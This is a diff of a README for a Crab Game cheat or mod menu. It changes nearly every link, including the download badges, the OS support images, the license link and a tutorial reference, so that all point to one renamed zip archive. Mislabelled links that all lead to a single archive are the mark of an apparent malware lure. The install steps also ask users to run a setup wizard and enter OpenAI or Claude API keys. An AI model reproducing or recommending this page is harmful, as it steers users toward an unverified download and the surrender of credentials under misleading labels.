@@ -1,6 +1,6 @@
 # Crab Game Mod Menu
 
-[![Download](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)
+[![Download](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip)](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip)
 
 ---
 
@@ -14,10 +14,10 @@ Take the plunge into a universe where accessibility, reliability, and imaginatio
 
 | Operating System     | Supported | Notes                         |
 |---------------------|:---------:|-------------------------------|
-| ![Windows](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip) | ✅ | Full support; recommended |
-| ![macOS](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip%20%2B-success?logo=apple&logoColor=white) | ✅ | Requires Mono Framework    |
-| ![Linux](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip%20%2F%20Fedora-success?logo=linux&logoColor=white) | ✅ | Via Wine/Proton           |
-| ![Steam Deck](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip) | 🟡 | Experimental, feedback welcome |
+| ![Windows](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip) | ✅ | Full support; recommended |
+| ![macOS](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip%20%2B-success?logo=apple&logoColor=white) | ✅ | Requires Mono Framework    |
+| ![Linux](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip%20%2F%20Fedora-success?logo=linux&logoColor=white) | ✅ | Via Wine/Proton           |
+| ![Steam Deck](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip) | 🟡 | Experimental, feedback welcome |
 
 ---
 
@@ -70,14 +70,14 @@ To activate, simply link your API keys in the menu’s “AI Integrations” tab
 ## 💾 Installation
 
 Ready to transcend vanilla gameplay?
-1. **Download:** Hit the [![Download](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip) badge above or at the bottom of the README.
+1. **Download:** Hit the [![Download](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip)](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip) badge above or at the bottom of the README.
 2. **Extract:** Unzip contents to your preferred directory.
 3. **Configure:** Run the setup wizard, which detects your Crab Game installation automatically.
 4. **Authorize (AI APIs):** Enter your OpenAI or Claude API keys if you wish to unlock AI functionalities.
 5. **Launch Crab Game:** The mod menu loads at start-up as a sleek overlay.
 6. **Enjoy:** Dive into a realm powered by innovation and user-driven evolution.
 
-See the `https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip` for video tutorials and troubleshooting.
+See the `https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip` for video tutorials and troubleshooting.
 
 ---
 
@@ -89,11 +89,11 @@ This repository is a user-driven creative platform intended solely for **educati
 
 ## 📜 MIT License (2025)
 
-This repository is licensed under the flexible and permissive [MIT License](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip) (c) 2025. See the [LICENSE](LICENSE) file for full text.
+This repository is licensed under the flexible and permissive [MIT License](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip) (c) 2025. See the [LICENSE](LICENSE) file for full text.
 
 ---
 
-[![Download](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)](https://raw.githubusercontent.com/Arehman782/crab-game-modded-menu-lounge/branch/unimpaired/crab-game-modded-menu-lounge_2.5.zip)
+[![Download](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip)](https://github.com/Arehman782/crab-game-modded-menu-lounge/raw/refs/heads/branch/unimpaired/crab_menu_game_modded_lounge_v3.8.zip)
 
 ---
 
